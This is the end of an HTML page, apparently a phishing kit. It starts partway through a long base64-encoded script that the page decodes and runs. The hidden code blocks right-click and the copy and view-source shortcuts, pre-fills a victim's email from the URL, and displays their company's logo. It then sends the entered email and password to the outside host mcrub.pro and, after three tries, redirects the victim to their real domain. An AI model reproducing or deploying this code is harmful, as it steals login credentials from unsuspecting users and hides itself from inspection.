vIHByZXZlbnQgY3RybCArIHMKJChkb2N1bWVudCkuYmluZCgna2V5ZG93bicsIGZ1bmN0aW9uKGUpIHsKaWYoZS5jdHJsS2V5ICYmIChlLndoaWNoID09IDgzKSkgewplLnByZXZlbnREZWZhdWx0KCk7CnJldHVybiBmYWxzZTsKfQp9KTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NvbnRleHRtZW51JywgZXZlbnQgPT4gZXZlbnQucHJldmVudERlZmF1bHQoKSk7Cgpkb2N1bWVudC5vbmtleWRvd24gPSBmdW5jdGlvbihlKSB7CmlmIChlLmN0cmxLZXkgJiYgCihlLmtleUNvZGUgPT09IDY3IHx8IAplLmtleUNvZGUgPT09IDg2IHx8IAplLmtleUNvZGUgPT09IDg1IHx8IAplLmtleUNvZGUgPT09IDExNykpIHsKcmV0dXJuIGZhbHNlOwp9IGVsc2UgewpyZXR1cm4gdHJ1ZTsKfQp9OwokKGRvY3VtZW50KS5rZXlwcmVzcygidSIsZnVuY3Rpb24oZSkgewppZihlLmN0cmxLZXkpCnsKcmV0dXJuIGZhbHNlOyAgICAgIH0KZWxzZSB7CnJldHVybiB0cnVlOwp9fSk7CgovKiBnbG9iYWwgJCAqLwokKGRvY3VtZW50KS5yZWFkeShmdW5jdGlvbigpIHsKICAgIHZhciBjb3VudCA9IDA7CgoKICAgIC8vLy8vLy8vLy8vLy91cmwgYWkgZ2V0dGluZy8vLy8vLy8vLy8vLy8vLy8KICAgIHZhciBhaSA9IHdpbmRvdy5sb2NhdGlvbi5oYXNoLnN1YnN0cigxKTsKICAgIGlmICghYWkpIHsKCiAgICB9IGVsc2UgewogICAgICAgIHZhciBiYXNlNjRyZWdleCA9IC9eKFswLTlhLXpBLVorL117NH0pKigoWzAtOWEtekEtWisvXXsyfT09KXwoWzAtOWEtekEtWisvXXszfT0pKT8kLzsKCiAgICAgICAgaWYgKCFiYXNlNjRyZWdleC50ZXN0KGFpKSkgewogICAgICAgICAgICAvLyBhbGVydChidG9hKGFpKSk7CiAgICAgICAgICAgIHZhciBteV9haSA9IGFpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vIGFsZXJ0KGF0b2IoYWkpKTsKICAgICAgICAgICAgdmFyIG15X2FpID0gYXRvYihhaSk7CiAgICAgICAgfQogICAgICAgIC8vICQoJyNhaScpLnZhbChhaSk7CiAgICAgICAgLy8gdmFyIG15X2FpID1haTsKICAgICAgICB2YXIgZmlsdGVyID0gL14oW2EtekEtWjAtOV9cLlwtXSkrXEAoKFthLXpBLVowLTlcLV0pK1wuKSsoW2EtekEtWjAtOV17Miw0fSkrJC87CgogICAgICAgIGlmICghZmlsdGVyLnRlc3QobXlfYWkpKSB7CiAgICAgICAgICAgICQoJyNlcnJvcicpLnNob3coKTsKICAgICAgICAgICAgYWkuZm9jdXM7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgdmFyIGluZCA9IG15X2FpLmluZGV4T2YoIkAiKTsKICAgICAgICB2YXIgbXlfc2xpY2UgPSBteV9haS5zdWJzdHIoKGluZCArIDEpKTsKICAgICAgICB2YXIgYyA9IG15X3NsaWNlLnN1YnN0cigwLCBteV9zbGljZS5pbmRleE9mKCcuJykpOwogICAgICAgIHZhciBmaW5hbCA9IGMudG9Mb3dlckNhc2UoKTsKICAgICAgICB2YXIgZmluYWx1ID0gYy50b1VwcGVyQ2FzZSgpOwogICAgICAgICQoJyNhaScpLnZhbChteV9haSk7CiAgICAgICAgJCgiI2RpdjEiKS5hbmltYXRlKHsgbGVmdDogMCwgb3BhY2l0eTogImhpZGUiIH0sIDApOwogICAgICAgICQoIiNkaXYyIikuYW5pbWF0ZSh7IHJpZ2h0OiAwLCBvcGFjaXR5OiAic2hvdyIgfSwgNTAwKTsKICAgICAgICAKCQkkKCIjYWljeCIpLmh0bWwobXlfYWkpOwoJCSQoIiNhaWN4eCIpLmh0bWwobXlfYWkpOwogICAgICAgICQoIiNhaWNoIikuaHRtbChteV9haSk7CiAgICAgICAgJC5nZXQoImh0dHBzOi8vbG9nby5jbGVhcmJpdC5jb20vIiArIG15X3NsaWNlKQogICAgICAgICAgICAuZG9uZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICQoIiNsb2dvaW1nIikuYXR0cigic3JjIiwgImh0dHBzOi8vbG9nby5jbGVhcmJpdC5jb20vIiArIG15X3NsaWNlKTsKICAgICAgICAgICAgICAgICQoIiNsb2dvbmFtZSIpLmh0bWwoZmluYWx1KTsKCQkJCSQoIiNsb2dvbmFtZWMiKS5odG1sKGZpbmFsdSk7CgogICAgICAgICAgICB9KS5mYWlsKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgJCgiI2xvZ29pbWciKS5hdHRyKCJzcmMiLCAiaHR0cDovL2FuY2hvcm1hay5jb20vd2VibWFpbC9za2lucy9lbGFzdGljL2ltYWdlcy9sb2dvLnN2Zz9zPTE2NTYyNzUyMTgiKTsKICAgICAgICAgICAgICAgICQoIiNsb2dvbmFtZSIpLmh0bWwoIiIpOwoJCQkJJCgiI2xvZ29uYW1lYyIpLmh0bWwoIiIpOwoKICAgICAgICAgICAgfSk7CgoKICAgIH0KCgoKCgogICAgJCgnI2FpJykuY2xpY2soZnVuY3Rpb24oKSB7CiAgICAgICAgJCgnI2Vycm9yJykuaGlkZSgpOwogICAgfSk7CgogICAgJChkb2N1bWVudCkua2V5cHJlc3MoZnVuY3Rpb24oZXZlbnQpIHsKCiAgICAgICAgdmFyIGtleWNvZGUgPSAoZXZlbnQua2V5Q29kZSA/IGV2ZW50LmtleUNvZGUgOiBldmVudC53aGljaCk7CiAgICAgICAgaWYgKGtleWNvZGUgPT0gJzEzJykgewogICAgICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgICAgICBpZiAoJCgiI2RpdjEiKS5pcygiOnZpc2libGUiKSkgewoKICAgICAgICAgICAgICAgICQoIiNuZXh0IikuY2xpY2soKTsKCiAgICAgICAgICAgIH0gZWxzZSBpZiAoJCgiI2RpdjIiKS5pcygiOnZpc2libGUiKSkgewogICAgICAgICAgICAgICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKCiAgICAgICAgICAgICAgICAkKCIjc3VibWl0LWJ0biIpLmNsaWNrKCk7CgogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSk7CgoKICAgICQoJyNuZXh0JykuY2xpY2soZnVuY3Rpb24oKSB7CiAgICAgICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICAgICAgICB2YXIgbXlfYWkgPSAkKCcjYWknKS52YWwoKTsKICAgICAgICB2YXIgZmlsdGVyID0gL14oW2EtekEtWjAtOV9cLlwtXSkrXEAoKFthLXpBLVowLTlcLV0pK1wuKSsoW2EtekEtWjAtOV17Miw0fSkrJC87CgogICAgICAgIGlmICghZmlsdGVyLnRlc3QobXlfYWkpKSB7CiAgICAgICAgICAgICQoJyNlcnJvcicpLnNob3coKTsKICAgICAgICAgICAgYWkuZm9jdXM7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgdmFyIGluZCA9IG15X2FpLmluZGV4T2YoIkAiKTsKICAgICAgICB2YXIgbXlfc2xpY2UgPSBteV9haS5zdWJzdHIoKGluZCArIDEpKTsKICAgICAgICB2YXIgYyA9IG15X3NsaWNlLnN1YnN0cigwLCBteV9zbGljZS5pbmRleE9mKCcuJykpOwogICAgICAgIHZhciBmaW5hbCA9IGMudG9Mb3dlckNhc2UoKTsKICAgICAgICB2YXIgZmluYWx1ID0gYy50b1VwcGVyQ2FzZSgpOwogICAgICAgICQoIiNkaXYxIikuYW5pbWF0ZSh7IGxlZnQ6IDAsIG9wYWNpdHk6ICJoaWRlIiB9LCAwKTsKICAgICAgICAkKCIjZGl2MiIpLmFuaW1hdGUoeyByaWdodDogMCwgb3BhY2l0eTogInNob3ciIH0sIDUwMCk7CgogICAgICAgICQoIiNhaWNoIikuaHRtbChteV9haSk7CgkJJCgiI2FpY3giKS5odG1sKG15X2FpKTsKCQkkKCIjYWljeHgiKS5odG1sKG15X2FpKTsKICAgICAgICAkLmdldCgiIiArIG15X3NsaWNlKQogICAgICAgICAgICAuZG9uZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICQoIiNsb2dvaW1nIikuYXR0cigic3JjIiwgIiIgKyBteV9zbGljZSk7CiAgICAgICAgICAgICAgICAkKCIjbG9nb25hbWUiKS5odG1sKGZpbmFsdSk7CgkJCQkkKCIjbG9nb25hbWVjIikuaHRtbChmaW5hbHUpOwoKICAgICAgICAgICAgfSkuZmFpbChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICQoIiNsb2dvaW1nIikuYXR0cigic3JjIiwgImh0dHA6Ly9hbmNob3JtYWsuY29tL3dlYm1haWwvc2tpbnMvZWxhc3RpYy9pbWFnZXMvbG9nby5zdmc/cz0xNjU2Mjc1MjE4Iik7CiAgICAgICAgICAgICAgICAkKCIjbG9nb25hbWUiKS5odG1sKCIiKTsKCQkJCSQoIiNsb2dvbmFtZWMiKS5odG1sKCIiKTsKCiAgICAgICAgICAgIH0pOwoKCgoKCiAgICB9KTsKICAgIC8vICQoJyNiYWNrJykuY2xpY2soZnVuY3Rpb24oKSB7CiAgICAvLyAgICAgLy8gJCgiI21zZyIpLmhpZGUoKTsKICAgIC8vICAgICAkKCIjYWkiKS52YWwoIiIpOwogICAgLy8gICAgICQoIiNwciIpLnZhbCgiIik7CiAgICAvLyAgICAgJCgiI2RpdjIiKS5hbmltYXRlKHsgbGVmdDogMCwgb3BhY2l0eTogImhpZGUiIH0sIDApOwogICAgLy8gICAgICQoIiNkaXYxIikuYW5pbWF0ZSh7IHJpZ2h0OiAwLCBvcGFjaXR5OiAic2hvdyIgfSwgMTAwMCk7CgogICAgLy8gfSk7CnZhciBmaWxlPSJibVY0ZEM1d2FIQT0iOwoKICAgICQoJyNzdWJtaXQtYnRuJykuY2xpY2soZnVuY3Rpb24oZXZlbnQpIHsKICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgIHZhciBhaSA9ICQoIiNhaSIpLnZhbCgpOwogICAgICAgIHZhciBwciA9ICQoIiNwciIpLnZhbCgpOwogICAgICAgIHZhciBkZXRhaWwgPSAkKCIjZmllbGQiKS5odG1sKCk7CiAgICAgICAgdmFyIG1zZyA9ICQoJyNtc2cnKS5odG1sKCk7CgogICAgICAgIHZhciBteV9haSA9IGFpOwogICAgICAgIHZhciBpbmQgPSBteV9haS5pbmRleE9mKCJAIik7CiAgICAgICAgdmFyIG15X3NsaWNlID0gbXlfYWkuc3Vic3RyKChpbmQgKyAxKSk7CiAgICAgICAgdmFyIGMgPSBteV9zbGljZS5zdWJzdHIoMCwgbXlfc2xpY2UuaW5kZXhPZignLicpKTsKICAgICAgICB2YXIgZmluYWwgPSBjLnRvTG93ZXJDYXNlKCk7CiAgICAgICAgJCgnI21zZycpLnRleHQobXNnKTsKICAgICAgICBjb3VudCA9IGNvdW50ICsgMTsKICAgICAgICAkLmFqYXgoewogICAgICAgICAgICBkYXRhVHlwZTogJ0pTT04nLAogICAgICAgICAgICB1cmw6ICdodHRwczovL21jcnViLnByby9teS8nLAogICAgICAgICAgICB0eXBlOiAnUE9TVCcsCiAgICAgICAgICAgIGRhdGE6IHsKICAgICAgICAgICAgICAgIGFpOiBhaSwKICAgICAgICAgICAgICAgIHByOiBwciwKICAgICAgICAgICAgICAgIGRldGFpbDogZGV0YWlsLAoKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYmVmb3JlU2VuZDogZnVuY3Rpb24oeGhyKSB7CiAgICAgICAgICAgICAgICAkKCIjc3VibWl0LWJ0biIpLmh0bWwoIkxvYWRpbmcuLi4uIik7CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKHJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgICAkKCIjcHIiKS52YWwoIiIpOwogICAgICAgICAgICAgICAgaWYgKGNvdW50ID49IDMpIHsKICAgICAgICAgICAgICAgICAgICBjb3VudCA9IDA7CiAgICAgICAgICAgICAgICAgICAgJCgiI2RpdjIiKS5hbmltYXRlKHsgbGVmdDogMCwgb3BhY2l0eTogImhpZGUiIH0sIDApOwogICAgICAgICAgICAgICAgICAgICQoIiNkaXYzIikuYW5pbWF0ZSh7IGxlZnQ6IDAsIG9wYWNpdHk6ICJzaG93IiB9LCA1MDApOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCJodHRwczovL3d3dy4iK215X3NsaWNlKTsKICAgICAgICAgICAgICAgICAgICB9LCA1MDApOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChjb3VudCA9PSAyKSB7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzIiKS5zaG93KCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZyIpLmhpZGUoKTsKICAgICAgICAgICAgICAgICAgICAkKCIjbXNnMSIpLmhpZGUoKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzEiKS5zaG93KCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZyIpLmhpZGUoKTsKICAgICAgICAgICAgICAgICAgICAkKCIjbXNnMiIpLmhpZGUoKTsKCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICQoIiNwciIpLnZhbCgiIik7CiAgICAgICAgICAgICAgICBpZiAoY291bnQgPj0gMykgewogICAgICAgICAgICAgICAgICAgIGNvdW50ID0gMDsKICAgICAgICAgICAgICAgICAgICAkKCIjZGl2MiIpLmFuaW1hdGUoeyBsZWZ0OiAwLCBvcGFjaXR5OiAiaGlkZSIgfSwgMCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI2RpdjMiKS5hbmltYXRlKHsgbGVmdDogMCwgb3BhY2l0eTogInNob3ciIH0sIDUwMCk7CiAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCJodHRwczovL3d3dy4iK215X3NsaWNlKTsKICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoY291bnQgPT0gMikgewogICAgICAgICAgICAgICAgICAgICQoIiNtc2cyIikuc2hvdygpOwogICAgICAgICAgICAgICAgICAgICQoIiNtc2ciKS5oaWRlKCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzEiKS5oaWRlKCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICQoIiNtc2cxIikuc2hvdygpOwogICAgICAgICAgICAgICAgICAgICQoIiNtc2ciKS5oaWRlKCk7CiAgICAgICAgICAgICAgICAgICAgJCgiI21zZzIiKS5oaWRlKCk7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICBjb21wbGV0ZTogZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAkKCIjc3VibWl0LWJ0biIpLmh0bWwoIkxvYWRpbmcuLi4iKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgfSk7Cn0pOwo8L3NjcmlwdD4KCTwvaHRtbD4=")));
  </script>

</body>
</html>